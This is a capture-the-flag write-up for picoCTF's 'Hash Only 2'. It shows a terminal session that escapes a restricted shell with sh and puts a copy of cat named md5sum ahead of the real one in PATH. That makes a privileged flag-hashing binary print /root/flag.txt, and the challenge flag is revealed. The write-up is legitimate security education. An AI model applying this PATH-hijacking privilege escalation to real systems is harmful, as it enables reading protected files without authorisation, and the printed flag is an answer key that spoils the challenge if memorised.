
# Hash Only 2

`Author: Junias Bonou`

> Description : Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!


Given in challenge after starting instance - 
```
SSH command - ssh ctf-player@rescued-float.picoctf.net -p <PORT> 

SSH password - <PASSWORD> 
```


## Solution

```bash
$ ssh ctf-player@rescued-float.picoctf.net -p <PORT> 
ctf-player@rescued-float.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1024-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
ctf-player@pico-chall$ cd
-rbash: cd: restricted

ctf-player@pico-chall$ which flaghasher
/usr/local/bin/flaghasher

ctf-player@pico-chall$ sh

\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ which cat
/usr/bin/cat

\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ cp $(which cat) md5sum

\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ chmod +x ./md5sum

\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ ls
md5sum

\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ export PATH=.:$PATH

\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ ./md5sum flaghasher
./md5sum: flaghasher: No such file or directory

\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ which flaghasher
/usr/local/bin/flaghasher


\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ /usr/local/bin/flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_9bde33ed}

```

Given a restricted shell.

The program `flaghasher` exist just as the previous chall (hash-only-1)[https://tusharr.xyz/shetcode/writeups/picoctf/pico-ctf-hash-only-1/]

The [restricted shell](https://0xffsec.com/handbook/shells/restricted-shells/) is a Unix shell that restricts some of the capabilities available to an interactive user session, or to a shell script, running within it.

Now escaping the restricted shell is simple, we can just use the `sh` command and can get a normal shell.

Now assuming the flaghasher binary at `/usr/local/bin/flaghasher` is similar to previous flaghasher binary, as in (hash-only-1)[https://tusharr.xyz/shetcode/writeups/picoctf/pico-ctf-hash-only-1/], we can craft our exploit same as previous one.

We'll create a fake `md5sum` executable add it's directory path to list of paths in `$PATH` environment variable using `export PATH=.:$PATH` command.

This time it has path to `cat` command. So instead of performing actual MD5 hashing we can trick `flaghasher` to execute `cat` instead of th real `md5sum` command.

And hence get our flag printed !
